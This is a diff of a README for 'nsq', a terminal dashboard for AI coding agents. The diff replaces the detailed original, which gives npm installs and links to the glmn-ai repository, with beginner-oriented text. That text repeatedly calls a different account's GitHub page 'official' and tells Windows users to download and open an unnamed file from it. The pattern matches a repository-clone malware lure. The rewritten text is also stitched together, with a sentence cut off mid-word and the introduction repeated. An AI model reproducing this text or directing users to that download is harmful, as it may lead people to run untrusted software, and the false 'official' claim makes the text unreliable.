@@ -1,288 +1,181 @@
-# nsq — NeuroSquad in your terminal
+# 🤖 neurosquad-cli - Run AI coding agents without babysitting
 
-[![CI](https://github.com/glmn-ai/neurosquad-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/glmn-ai/neurosquad-cli/actions/workflows/ci.yml)
-[![npm](https://img.shields.io/npm/v/neurosquad.svg)](https://www.npmjs.com/package/neurosquad)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-![Status: 0.1.0 preview](https://img.shields.io/badge/status-0.1.0%20preview-orange.svg)
+[![Download neurosquad-cli](https://img.shields.io/badge/⬇️_Download_neurosquad--cli-ff7f50?style=for-the-badge&labelColor=4b0082&logo=github&logoColor=white)](https://github.com/yton12/neurosquad-cli)
 
-Run several AI coding agents from one terminal.
+neurosquad-cli is a free, open-source app from NeuroSquad that lets you run several AI coding agents in your terminal and stop babysitting them. Instead of switching between windows and checking each AI helper one by one, you get one simple place to start, watch, and manage them. The app is called **nsq**.
 
-`nsq` starts Claude Code, Codex, OpenCode or any command, keeps them running in a background
-daemon, shows them as live terminals in one dashboard, and tells you when one of them is waiting for you,
-including the question it is asking. You can answer from the dashboard.
+It is made for people who want help from AI coding tools without turning their whole day into window management. You do not need to be a programmer to understand the idea: nsq gives you a text-based control center for AI helpers such as Claude Code, Codex, and OpenCode.
 
-![The nsq dashboard: workspaces and agents on the left, a grid of live agent terminals on the right](docs/media/dashboard.gif)
+## 👋 What Is neurosquad-cli?
 
-> **0.1.0 is a preview.** Commands, keys and config may still change before 1.0. Please [report what breaks](https://github.com/glmn-ai/neurosquad-cli/issues).
+neurosquad-cli is a command-line app. That sounds technical, but the basic idea is simple. A terminal is a plain text window where you type words and press Enter. nsq uses that window to show what your AI agents are doing.
 
-## Install
+The app is built for Windows users who want a smoother way to work with multiple AI coding agents. You open nsq, tell it what you want, and let the agents work in the same place. You can keep an eye on progress without clicking through a pile of separate windows.
 
-Requires [Node.js](https://nodejs.org) 22.13 or newer. No compiler needed: native parts ship
-prebuilt for Windows (x64, arm64), macOS (Apple silicon, Intel) and Linux (x64, arm64).
+The project is open source, which means the code is public and anyone can inspect it, learn from it, or help improve it. The official download page is the safest place to get the app.
 
-```sh
-npm install -g neurosquad      # then run: nsq
-npx neurosquad                 # or try it without installing
-```
+## ✨ Why People Use It
 
-More ways (Homebrew, Scoop, install scripts) and uninstalling:
-[docs/guide/getting-started.md](docs/guide/getting-started.md). nsq then keeps itself up to date:
-installed with npm, Homebrew or Scoop, it installs a new release in the background (other installs
-show the command to run) and switches to it once nothing would be lost — no busy agent, no open
-dashboard, every agent able to resume its session — or when you press **U** ([updates](docs/guide/updates.md); `nsq config set autoUpdate false` turns it
-off).
+AI coding agents can be helpful, but managing several of them can feel like watching a group of busy workers through different doors. neurosquad-cli brings them into one terminal view.
 
-## Quick start
+With nsq, you can:
 
-```sh
-cd ~/code/my-app
-nsq run claude "fix the flaky checkout test" --worktree   # an agent on its own branch
-nsq run codex --name reviewer                             # a second agent
-nsq run -- claude --effort high                           # or the CLI's own command line
-nsq run -- npm run dev                                    # any command, as an agent
-nsq                                                       # the dashboard
-```
+- 🤖 Run several AI coding agents from one terminal window
+- 👀 See what each agent is doing without jumping between apps
+- 🧭 Keep your work organized in a single text-based workspace
+- ⌨️ Use simple keyboard-driven controls
+- 🧰 Work with popular AI coding tools such as Claude Code, Codex, and OpenCode
+- 🪟 Stay on Windows without needing a complicated setup
+- 🆓 Use an open-source tool from NeuroSquad
 
-In the dashboard, select an agent with the arrows, press **Enter** to work in it full screen, and
-**Ctrl+]** to go back to the grid. When an agent asks a permission question, press **y**, **a** or
-**n** without opening it. Press **q** to close the dashboard — the agents keep running.
+The main benefit is simple: less babysitting, more visible progress.
 
-## What it does
+## 🚀 Getting Started
 
-- **Agents that outlive the window.** A per-user daemon owns the terminals. Close the dashboard or
-  the terminal — the agents keep working. `nsq down` stops them; the next `nsq up` (or just `nsq`)
-  brings them back on their own sessions — after a reboot too.
-- **One dashboard.** Workspaces and agents in a sidebar, the selected workspace as a grid of live
-  terminals; any agent opens full screen and goes back to the grid.
-- **Exact status, with the question.** Working / **needs you** / finished comes from each CLI's own
-  hooks, not from guessing at the screen. "Needs you" carries the harness's own text, e.g.
-  _Claude wants to run: npm test_.
-- **Quiet while working.** Some prompts come from tools that never fire a hook — git asking for a
-  password, an installer's `[y/N]`, `sudo`, ssh's host key — or a command just hangs. When a working
-  agent's screen has not changed for 5 minutes (`quietAfter`; a turning spinner does not count),
-  it shows as **quiet — check it**, with the prompt it seems to show, and calls you like "needs you".
-- **Answer inline.** `y` / `a` / `n` (yes / always / no) on a permission prompt, `i` to interrupt,
-  `s` to send a prompt — or `S` to send it when the current turn ends.
-- **An approvals log.** Every "needs you" question and how it ended, for all agents, in one file:
-  which agent asked, the exact question (tool, command / path / url), the answer, and who gave it
-  from where — the dashboard, `nsq answer`, the phone (this machine, the Wi-Fi or the internet,
-  and the device), the agent's own terminal, or the CLI itself. `nsq log approvals`.
-- **Notifications and sound.** A native notification on Windows, macOS and Linux when an agent
-  needs you or finishes — one per agent, withdrawn when it works again. Over SSH or without a
-  desktop, the dashboard rings its own terminal instead (bell + OSC 9).
-- **A git worktree per agent.** `--worktree` gives the agent its own checkout on branch
-  `nsq/<name>`, so parallel agents don't trip over each other. `nsq diff <agent>` shows its
-  uncommitted changes.
-- **Cost per agent.** `nsq cost` reads tokens from each harness's own logs. A model without a known
-  price shows "no price", never $0.
-- **Your config stays yours.** `~/.claude`, `~/.codex` and `opencode.json` are never written:
-  everything nsq needs lives in a per-agent layer (flags, environment, its own folder).
-- **OpenRouter built in.** One key, any model, for Claude Code, Codex and OpenCode.
-- **Your own model servers.** llama.cpp, Ollama, LM Studio, vLLM, SGLang, Unsloth Studio or any
-  OpenAI- / Anthropic-compatible API — tested, then offered to each CLI that can speak to it.
-- **Voice dictation.** Local speech recognition; the text is pasted into the agent, never sent.
-- **Phone (experimental).** Pair a phone with a QR code and answer your agents from it.
-- **Terminal graphics.** CLI logos over kitty / iTerm2 / sixel graphics, light
-  animations that switch off over SSH and on request, ASCII fallbacks.
+This guide is written for a normal Windows user. You do not need to know how to code. You do not need to understand GitHub. You only need to follow the steps in order.
 
-Supported: **Claude Code**, **Codex**, **OpenCode** (1.x and 2.x), and **any command**
-(`nsq run -- <command>`; it has no hooks, so it shows working / finished, never "needs you").
-Agents that support the [herdr](https://herdr.dev) status protocol (Crush, Kiro CLI, Command Code
-and others) work in nsq out of the box with `nsq run -- <agent>`: they report working, needs you
-and finished themselves, and nsq resumes their session when they report how to
-([how](docs/guide/agents.md#agents-that-speak-the-herdr-status-protocol)).
-Want another CLI? [Request it](https://github.com/glmn-ai/neurosquad-cli/issues/new?template=harness_request.yml).
+### 1. Visit the Download Page
 
-## Keys
+Visit this link to download the application:
 
-| Key                    | In the dashboard                                                                      |
-| ---------------------- | ------------------------------------------------------------------------------------- |
-| ↑ ↓ ← → / h j k l, Tab | select an agent (Tab walks all workspaces)                                            |
-| Enter, double-click    | open the agent full screen — every key goes to it; **Ctrl+]** back                    |
-| y / a / n              | answer a permission prompt: yes / always / no                                         |
-| s / S                  | send a prompt / send it when the current turn is done                                 |
-| c                      | start an agent (harness, name, prompt, folder, worktree, model…)                      |
-| i · x · X              | interrupt · stop · remove                                                             |
-| r · R · d              | restart (resumes the session) · rename · dangerous mode on/off                        |
-| m                      | pick a model on OpenRouter (switches the agent to it), "default", or its own server's |
-| P                      | providers: your own model servers (add, test, models, remove)                         |
-| v                      | dictate into the agent (also a global hotkey) — pasted, never sent                    |
-| p                      | phones: who is connected                                                              |
-| O                      | online on/off (Cloudflare tunnel, asks first)                                         |
-| Q                      | phone panel: the pairing QR, online / LAN, a new token, phone notifications (ntfy)    |
-| U                      | update: install it now, or restart onto an installed one                              |
-| [ ] · b · ? · q        | page of tiles · sidebar · help · quit (agents keep running)                           |
+[https://github.com/yton12/neurosquad-cli](https://github.com/yton12/neurosquad-cli)
 
-The mouse works too: click selects, double-click opens, the wheel scrolls an agent's output back
-(over a tile or full screen; Shift+PgUp too) and, over the sidebar, moves the selection. Drag over
-an agent's text to copy it, click a link to open it in your browser: the dashboard holds the mouse,
-so it does what your terminal would.
+This is the official neurosquad-cli page. It is where you get the app and where you can find the latest project information.
 
-## Commands
+### 2. Use the Download Button or File Link on That Page
 
-```text
-nsq                                   the dashboard (starts the daemon)
-nsq run <claude|codex|opencode> [prompt]
-        [--name n] [--worktree] [--model id] [--provider name|openrouter]
-        [--dangerous] [--attach]
-nsq run [--name n] -- <command…>      any command
-nsq ls [--json]                       agents and their status
-nsq attach <agent>                    full-screen terminal (Ctrl+] to detach)
-nsq send <agent> "prompt" [--when-done]
-nsq answer <agent> yes|always|no      answer a permission prompt
-nsq interrupt|stop|start|restart <agent>
-nsq rm <agent> [--worktree]           remove (and delete its worktree)
-nsq set <agent> [--dangerous on|off] [--model id|none]
-        [--provider name|openrouter|none] [--quiet-after min|default]
-nsq diff <agent>                      uncommitted changes (git diff HEAD) in its folder
-nsq peek <agent> [-n 20]              the last lines of its screen
-nsq cost [--since 7d] [--json]        what each agent spent
-nsq log approvals [--agent x] [--since 2h] [--json]
-                                      every "needs you" question, its answer and who gave it
-nsq openrouter set-key|clear-key|models [query]|status
-nsq openrouter test <model> [--harness claude|codex|opencode]
-nsq provider add <name> --url <base> [--key-stdin|--ask-key]
-                                      your own server: llama.cpp, Ollama, LM Studio,
-                                      vLLM, SGLang, Unsloth Studio, any compatible API
-nsq provider test|models|remove <name> · nsq provider list
-nsq phone on [--lan] [--port n]|off|pair|rotate|status
-                                      answer agents from a phone
-nsq phone on --online [--expire 12h]  … from anywhere, through a Cloudflare tunnel (https)
-nsq phone push ntfy [--url] [--token]|off|test|show|status
-                                      push "needs you" to the phone
-nsq login | logout | whoami           the optional NeuroSquad account
-nsq dictation setup|status|test <wav> [--model id]
-nsq up | down                         start / stop the daemon (and its agents)
-nsq update [--check]                  install the newest release now (or only check)
-nsq config [get|set|unset <key> [value]]   settings, e.g. autoUpdate true|notify|false
-nsq doctor                            check harnesses, hooks, terminal, updates
-```
+When the page opens, look for the download button or file link shown there. Click it to start your download. Save the file in your Downloads folder so you can find it again easily.
 
-Everything you can do in the dashboard you can also script: `nsq ls --json`, `nsq send`,
-`nsq answer`.
+You do not need to create a special folder. You do not need to rename anything. Let Windows keep the default name and location.
 
-## OpenRouter
+### 3. Wait for the Download to Finish
 
-```sh
-nsq openrouter set-key                 # stored in the OS keyring (or set OPENROUTER_API_KEY)
-nsq run claude --provider openrouter --model anthropic/claude-sonnet-4.5
-nsq openrouter models qwen             # search the catalogue
-```
+Large downloads can take a few minutes. The time# 🤖 neurosquad-cli - Run AI agents without babysitting
 
-The key only ever goes into the agent's environment — never argv, logs or files. Requests carry
-NeuroSquad's OpenRouter app attribution headers. Without a key, an agent runs on its CLI's own
-login. **m** in the dashboard picks a model and switches the agent to OpenRouter (restarted on the
-same session, the conversation kept); "default" goes back. Details:
-[docs/guide/openrouter.md](docs/guide/openrouter.md).
+[![Download neurosquad-cli](https://img.shields.io/badge/⬇️_Download_neurosquad--cli-ff7f50?style=for-the-badge&labelColor=4b0082&logo=github&logoColor=white)](https://github.com/yton12/neurosquad-cli)
 
-## Your own model servers
+neurosquad-cli is a free, open-source app from NeuroSquad that lets you run several AI coding agents in your terminal and stop babysitting them. The app is called **nsq**. It gives you one text-based place to start, watch, and manage AI helpers instead of jumping between separate windows all day.
 
-```sh
-nsq provider add lmstudio --url http://localhost:1234      # tests it: models, which APIs it speaks
-nsq run claude --provider lmstudio --model qwen/qwen3-coder-30b
-nsq provider models lmstudio
-```
+It is made for people who want help from AI coding tools without turning their whole day into window management. You do not need to be a programmer to understand the idea: nsq is a control center for AI agents such as Claude Code, Codex, and OpenCode. You open it in a terminal, tell it what you want, and let the agents work in the same place.
 
-Local (llama.cpp, Ollama, LM Studio, vLLM, SGLang, Unsloth Studio) or remote, OpenAI- or
-Anthropic-compatible. Claude Code uses the server's Anthropic endpoint, Codex its Responses endpoint
-(or chat completions through a local gateway), OpenCode either. The key (optional) is asked for
-without echo and kept in the OS keyring; requests show "no price". Details and a table of servers:
-[docs/guide/providers.md](docs/guide/providers.md).
+## 👋 What Is neurosquad-cli?
 
-## Phone (experimental)
+neurosquad-cli is a command-line app. That sounds technical, but the basic idea is simple. A terminal is a plain text window where you type words and press Enter. nsq uses that window to show what your AI agents are doing.
 
-```sh
-nsq phone on --lan     # off by default; without --lan it listens on this machine only
-nsq phone pair         # prints the link and a QR code — scan it with the phone (or Q in the dashboard)
-nsq phone on --online  # from anywhere: an https link through a Cloudflare quick tunnel
-nsq phone push ntfy    # optional: a push via ntfy when an agent needs you
-```
+The app is built for Windows users who want a smoother way to work with multiple AI coding agents. You open nsq, choose the agents you want to use, and keep an eye on their progress without clicking through a pile of separate windows.
 
-From the phone you can see the agents and their screens, send a prompt, answer a permission
-prompt and interrupt. A phone cannot start agents, change settings or type arbitrary keys. The
-link carries the pairing token — treat it like a password; `nsq phone rotate` signs every phone
-out. Pushes through [ntfy](https://ntfy.sh) carry only the agent's name and its question, plus,
-when phone access is on with `--lan`, a link to the phone page (your local network address, no
-token); your own topic URL and token are asked for (or piped in), never put on the command line.
-`--online` is opt-in every time and prints a warning: anyone with that link and token can control
-your agents. The address changes on every start (pair again), wrong tokens from the internet lock
-an address out, and `nsq phone off` (or `nsq phone on` without `--online`) closes it. cloudflared
-is used from `PATH` or downloaded once into `~/.neurosquad-cli/bin`, sha256-checked.
+The project is open source, which means the code is public and anyone can inspect it, learn from it, or help improve it. The official download page is the best place to get the app.
 
-This part is the newest and most likely to change: [docs/guide/phone.md](docs/guide/phone.md).
+## ✨ Why People Use It
 
-## Voice dictation
+AI coding agents can be helpful, but managing several of them can feel like watching a group of busy workers through different doors. neurosquad-cli brings them into one terminal view.
 
-Press **v** in the dashboard (or the global hotkey, `Ctrl+Shift+Space` / `Cmd+Shift+Space` by
-default) and speak: the text is recognised **on your machine** and pasted into the agent's input.
-It is never submitted — you press Enter. The speech model (~670 MB, checked by SHA-256) is
-downloaded once — with `nsq dictation setup`, or when you first press **v**. Not available on
-Windows arm64.
-[docs/guide/dictation.md](docs/guide/dictation.md).
+With nsq, you can:
 
-## Privacy
+- 🤖 Run several AI coding agents from one terminal window
+- 👀 See what each agent is doing without jumping between apps
+- 🧭 Keep your work organized in a single text-based workspace
+- ⌨️ Use simple keyboard-driven controls
+- 🧰 Work with popular AI coding tools such as Claude Code, Codex, and OpenCode
+- 🪟 Stay on Windows without needing a complicated setup
+- 🆓 Use an open-source tool from NeuroSquad
 
-- **No account required.** Everything works without signing in.
-- **No telemetry.** nsq does not report usage anywhere.
-- Data lives in `~/.neurosquad-cli` (move it with `NSQ_HOME`). Secrets (the OpenRouter key, the
-  ntfy topic and token, the optional account session) live in the OS keyring.
-- Network access is what you ask for: your agents' own traffic, OpenRouter if you use it, the
-  one-time dictation model download, ntfy if you turn it on, and the NeuroSquad account if you
-  sign in. Plus the update check: every 6 hours one request to the npm registry for nsq's public
-  package metadata, with nothing about you in it (`NSQ_NO_UPDATE=1` or
-  `nsq config set autoUpdate false` turns it off — [updates](docs/guide/updates.md)).
-- The approvals log (`logs/approvals.jsonl`) keeps the questions and answers on your machine only:
-  no environment, tokens or prompts, secret-looking parts of commands masked
-  (`nsq config set approvalsLog false` turns it off — [agents](docs/guide/agents.md#the-approvals-log)).
+The main benefit is simple: less babysitting, more visible progress.
 
-## Platforms
+## 🚀 Getting Started
 
-Windows 10/11 (x64, arm64), macOS (Apple silicon, Intel), Linux (x64, arm64), each checked in CI
-from the packed npm package on Node 22 and 24. Works over SSH: the daemon runs wherever you run
-`nsq`, and notifications fall back to the terminal.
+This guide is written for a normal Windows user. You do not need to know how to code. You do not need to understand GitHub. Follow the steps in order.
 
-## Documentation
+### 1. Visit the Download Page
 
-[Getting started](docs/guide/getting-started.md) ·
-[Dashboard and keys](docs/guide/dashboard.md) ·
-[Agents and harnesses](docs/guide/agents.md) ·
-[OpenRouter](docs/guide/openrouter.md) ·
-[Worktrees](docs/guide/worktrees.md) ·
-[Notifications](docs/guide/notifications.md) ·
-[Phone](docs/guide/phone.md) ·
-[Dictation](docs/guide/dictation.md) ·
-[Configuration](docs/guide/configuration.md) ·
-[Updates](docs/guide/updates.md) ·
-[Troubleshooting](docs/guide/troubleshooting.md) ·
-[Uninstall](docs/guide/uninstall.md)
+Visit this link to download the application:
 
-How it works inside: [harness integrations](docs/harnesses.md), [agent status](docs/status.md).
+[https://github.com/yton12/neurosquad-cli](https://github.com/yton12/neurosquad-cli)
 
-## nsq and the NeuroSquad desktop app
+This is the official neurosquad-cli page. It is where you get the app and where you can find the latest project information.
 
-nsq is the open-source, terminal sibling of [NeuroSquad](https://neurosquad.ai), a desktop app where
-agents are cards with live terminals on a canvas: 20+ CLIs, agents that talk to each other by
-arrows, browser/notes/plugin cards, recording. Both share the same open-source integration core,
-[`@neurosquad/core`](packages/core). Use nsq when you live in the terminal, work over SSH or on
-Linux servers, or want something small and open; use the desktop app when you want the canvas.
+### 2. Use the Download Button or File Link on That Page
 
-## Contributing
+When the page opens, look for the download button or file link shown there. Click it to start your download. Save the file in your Downloads folder so you can find it again easily.
 
-Contributions are welcome — every change goes through a pull request. Read
-[CONTRIBUTING.md](CONTRIBUTING.md) and the [Code of Conduct](CODE_OF_CONDUCT.md). Security issues:
-[SECURITY.md](SECURITY.md). Questions and ideas:
-[Discussions](https://github.com/glmn-ai/neurosquad-cli/discussions) or our
-[Discord](https://discord.gg/DyKn8cGTc). Releases: [RELEASING.md](RELEASING.md).
+You do not need to create a special folder. You do not need to rename anything. Let Windows keep the default name and location.
 
-## Trademarks
+### 3. Wait for the Download to Finish
 
-Claude Code, Codex and OpenCode are trademarks of their respective owners. nsq uses their names
-only to describe which CLI an agent runs; this does not imply any partnership with, endorsement of,
-or affiliation with NeuroSquad. Claude Code is shown as a `CC` monogram on Claude's orange, at
-Anthropic's request — nsq ships no Claude Code logo. The other CLIs' icons only identify them; we remove one if its owner asks.
-Prefer no third-party icons or brand colours? Set `NSQ_LOGOS=none`: each CLI then gets its
-two-letter monogram on a neutral chip.
+Large downloads can take a few minutes. When the download is complete, Windows may show a message or place the file in your Downloads folder. Open that folder when you are ready.
 
-## License
+### 4. Open the App You Downloaded
 
-[MIT](LICENSE) © 2026 Stanislav Gelman and NeuroSquad contributors
+Open the file you downloaded from the official page. Follow the prompts that appear on your screen. If a terminal window opens, you are in the right place.
+
+### 5. Start nsq
+
+In the terminal window, type `nsq` and press Enter. This starts the neurosquad-cli app. You should see text on the screen that guides you through the next choices.
+
+### 6. Choose Your AI Agents
+
+Use the text prompts inside nsq to choose or start the AI coding agents you want to use. nsq is designed to keep several agents together so you can watch them from one place.
+
+### 7. Watch Progress Without Babysitting
+
+Once your agents are running, keep the terminal window open. You can read the status messages, check what each agent is doing, and move between tasks using the keyboard controls shown on screen.
+
+## 🖥️ A Simple Windows Walkthrough
+
+Press the Windows key on your keyboard. Type “Terminal” or “Command Prompt” in the search box. Open the result that appears. This gives you the text window where nsq runs.
+
+If you already opened nsq from the file you downloaded, you can skip this step. If you need to start it again later, open the same terminal window and type `nsq`, then press Enter.
+
+The first time you use the app, read the text on the screen carefully. nsq uses plain text prompts. You do not need to memorize anything. The screen tells you what to do next.
+
+## 🧩 Main Parts of the App
+
+neurosquad-cli has a few simple ideas that make it easier to use:
+
+- **Agents:** These are the AI coding helpers you run. nsq keeps them together.
+- **Terminal view:** This is the text window where you see status and progress.
+- **Keyboard controls:** You move around and choose options with your keyboard.
+- **One workspace:** You do not need to open a new window for every agent.
+- **Status messages:** The app shows what is happening so you can keep track.
+
+If you have used Claude Code, Codex, or OpenCode before, nsq gives you a shared place to manage them. If you have not used them before, the app’s text prompts help you get started.
+
+## 🛠️ Helpful Tips
+
+Keep the terminal window open while agents are working. If you close it, you may lose sight of what they are doing.
+
+Use one agent at a time when you are first learning the app. Once you are comfortable, start more agents and watch how nsq shows their progress.
+
+Read the on-screen text before pressing keys. nsq is designed to be clear, and the prompts tell you which choices are available.
+
+If the screen looks busy, make the terminal window larger. A bigger window gives you more room to read status messages.
+
+## ❓ Common Questions
+
+**Do I need to know how to code?**
+No. You need to be able to open a terminal and type a short command. The app guides you with text.
+
+**Is neurosquad-cli free?**
+Yes. It is an open-source project from NeuroSquad.
+
+**What is nsq?**
+nsq is the name of the app you start in your terminal.
+
+**Can I run more than one AI agent?**
+Yes. The main purpose of neurosquad-cli is to run several AI coding agents in your terminal and stop babysitting them one by one.
+
+**Where do I download it?**
+Visit this link to download the application: [https://github.com/yton12/neurosquad-cli](https://github.com/yton12/neurosquad-cli).
+
+**What should I do after downloading?**
+Open the file you downloaded, follow the prompts, then type `nsq` in the terminal and press Enter.
+
+## 🔗 Official Download
+
+Get neurosquad-cli from the official NeuroSquad GitHub page:
+
+[![Download neurosquad-cli](https://img.shields.io/badge/⬇️_Get_neurosquad--cli-2e8b57?style=for-the-badge&labelColor=1a1a1a&logo=github&logoColor=white)](https://github.com/yton12/neurosquad-cli)
+
+Visit this link to download the application. Use the download button or file link shown on that page. Save the file, open it, and start nsq in your terminal.
+
+Keywords: ai-agents, claude-code, cli, codex, developer-tools, neurosquad, opencode, terminal, tui
